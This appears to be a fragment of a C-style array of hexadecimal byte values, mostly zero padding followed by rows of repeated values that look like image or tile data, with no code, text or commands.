0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x1B, 0x07, 0x19, 0x18, 0x17, 0x16, 0x08,
0x14, 0x13, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x13, 0x13, 0xE3, 0x14, 0x08, 0x08,
0x08, 0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x9C, 0x17, 0x16, 0x14, 0xE5, 0xE5, 0x08, 0x9E, 0x9D,
0x9E, 0x9E, 0x08, 0x08, 0x08, 0x9E, 0x9E, 0x16, 0x16, 0x9A, 0x08, 0x08, 0x16, 0x08, 0x08, 0x08,
0x9A, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x16, 0x16, 0x16, 0x9E, 0x9E, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x9A, 0x9A, 0x9F, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x08, 0x08, 0x9A, 0x16, 0x9B, 0x16, 0x16, 0x16, 0x16, 0x16, 0x9E, 0x9E, 0x9A, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x9A, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9E, 0x14, 0xE5,
0xE7, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xE8, 0xE8, 0xE8, 0xE8, 0xE7,
0xE7, 0xE7, 0xE7, 0xE7, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6,
0xE5, 0xE5, 0xE5, 0xE5, 0xE4, 0x14, 0x08, 0x9A, 0x9B, 0x9D, 0x9C, 0x9C, 0x9C, 0x9B, 0x9D, 0x16,
0x9E, 0x9E, 0x9E, 0x9A, 0x08, 0xCE, 0x12, 0x11, 0x11, 0x11, 0x12, 0x13, 0xE3, 0xE3, 0x14, 0x08,
0x9E, 0x16, 0x9B, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9B, 0x9D, 0x9B, 0x9C, 0x9C,
0x9D, 0x9D, 0x9D, 0x9C, 0x9D, 0x9E, 0x14, 0xE6, 0xCE, 0xCE, 0xCE, 0xCF, 0x12, 0x12, 0x12, 0x12,
0x13, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE5,
0xE5, 0xE5, 0xE5, 0x13, 0xE0, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0xE5, 0x08, 0x08, 0x08, 0x08, 0x16, 0x16, 0x16, 0x16, 0x16, 0x16, 0x9B, 0x9B,
0x9B, 0x9B, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9E, 0x08, 0xE5, 0xE5, 0x08, 0x9B,
0x9E, 0x9E, 0x9A, 0x08, 0x9E, 0x9B, 0x9D, 0x9D, 0x9D, 0x9E, 0x08, 0x08, 0x9E, 0x9B, 0x9E, 0x9E,
0x9E, 0x9B, 0x9C, 0x9C, 0x9C, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9B, 0x9E,
0x08, 0x08, 0x08, 0x08, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9E, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9A, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x9A, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B, 0x9B, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14,
0x14, 0x08, 0x9A, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9E, 0x08,
0x14, 0xE4, 0xE4, 0xE4, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5, 0xE6, 0xE6, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5,
0xE5, 0xE5, 0xE5, 0xE5, 0xE5, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x9A, 0x9E, 0x9E, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B,
0x9B, 0x9B, 0x9E, 0x08, 0x14, 0xCF, 0x11, 0x11, 0x11, 0x11, 0x12, 0x13, 0xE3, 0xE4, 0x08, 0x9A,
0x9E, 0x9E, 0x9B, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9F, 0xE4, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCF, 0x12, 0x12, 0xCF,
0xE5, 0x08, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9E, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0x14, 0x08, 0x16, 0x16, 0x16, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x08, 0x14, 0xCB, 0xE4,
0x08, 0x9E, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9B, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9B, 0x9A, 0x9A,
0x08, 0x08, 0x08, 0x08, 0x9E, 0x9B, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x9C, 0x9D, 0x9D, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9D, 0x9D, 0x9D,
0x9D, 0x16, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9A, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x14, 0x08, 0x9D, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9E, 0x9F,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x9F,
0x9E, 0x9E, 0x9A, 0x9A, 0x9A, 0x9A, 0x9B, 0x9B, 0x9C, 0x9C, 0x17, 0x9C, 0x9C, 0x9C, 0x9D, 0x9B,
0x9E, 0x9E, 0x9F, 0x08, 0xE4, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x13, 0xE3, 0x14, 0x9A, 0x9A,
0x9E, 0x9B, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17,
0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x08, 0xE6, 0xCF, 0xCE, 0xCE, 0xCE, 0xCE, 0xCF, 0x12, 0x12, 0xE6,
0x14, 0x9E, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9E, 0x9D, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x17,
0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x13, 0x13, 0xE0, 0x13, 0x13, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x13, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0x08, 0x14, 0xE5, 0xCE,
0xCD, 0x14, 0x08, 0x9F, 0x9E, 0x9D, 0x9D, 0x9D, 0x9B, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D,
0x9C, 0x9D, 0x9E, 0x08, 0x08, 0x08, 0x9E, 0x9B, 0x9B, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9B, 0x9B, 0x9B, 0x9B, 0x9A, 0x9A, 0x9B, 0x9B, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9A, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9B, 0x9B, 0x9B, 0x9D, 0x9D, 0x9B, 0x9B, 0x9B, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x08, 0x08,
0x14, 0x08, 0x9D, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x9F, 0x9F, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x08, 0x08, 0x08, 0x08, 0x9F,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9D, 0x9D, 0x9B, 0x9E,
0x9A, 0x9F, 0x08, 0x14, 0xCE, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0xE6, 0xE4, 0x14, 0x9A, 0x9B,
0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x17, 0x17, 0x17, 0x9C, 0x9E, 0x14, 0xCE, 0xCF, 0xCE, 0xCE, 0xCE, 0xCE, 0xCF, 0x12, 0xCE, 0xE4,
0x9F, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x9C, 0x17,
0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x9C,
0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x9C, 0x9C, 0x9C, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0x13, 0x13, 0xE8, 0x12,
